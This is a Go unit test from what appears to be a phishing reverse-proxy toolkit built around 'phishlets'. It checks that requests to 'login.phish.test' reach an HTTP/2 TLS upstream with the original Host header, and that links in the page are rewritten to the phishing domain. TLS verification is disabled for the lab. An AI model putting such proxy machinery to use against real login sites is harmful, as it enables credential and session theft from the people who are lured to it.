package proxy

import (
	"crypto/tls"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/phantom-v2/phantom/core/phishlet"
	"github.com/phantom-v2/phantom/core/session"
	"github.com/phantom-v2/phantom/internal/upstream"
)

// Полный стек: Director + H2-транспорт + TLS-апстрим. Какой Host доехал?
func TestH2StackHost(t *testing.T) {
	var gotHost string
	up := httptest.NewUnstartedServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		gotHost = r.Host
		w.Header().Set("Content-Type", "text/html")
		_, _ = w.Write([]byte(`<a href="https://origin.upstream.test/">x</a>`))
	}))
	up.EnableHTTP2 = true
	up.StartTLS()
	defer up.Close()

	st := phishlet.NewStore()
	if err := st.LoadDir("../../configs/phishlets"); err != nil {
		t.Fatal(err)
	}
	eng := New(st, session.NewMemory(0), nil)
	eng.SetUpstream(map[string]string{"origin.upstream.test": up.URL})
	insecureH2 := upstream.Default().Clone()
	insecureH2.TLSClientConfig = &tls.Config{InsecureSkipVerify: true} //nolint:gosec // lab only
	eng.SetTransport(insecureH2)
	eng.SetJS(func(src string, _ int64) string { return src })

	req := httptest.NewRequest(http.MethodGet, "http://login.phish.test/", nil)
	req.Header.Set("User-Agent", "Mozilla/5.0 Chrome/126")
	req.Header.Set("Accept-Language", "en-US")
	req.Header.Set("Accept", "text/html")
	rec := httptest.NewRecorder()
	eng.ServeHTTP(rec, req)
	if rec.Code != 200 {
		t.Fatalf("code=%d body=%q", rec.Code, rec.Body.String())
	}
	if !strings.Contains(rec.Body.String(), "login.phish.test") {
		t.Fatalf("rewrite missing: %q", rec.Body.String())
	}
	if gotHost != "origin.upstream.test" {
		t.Fatalf("H2 upstream Host = %q, want origin.upstream.test", gotHost)
	}
}
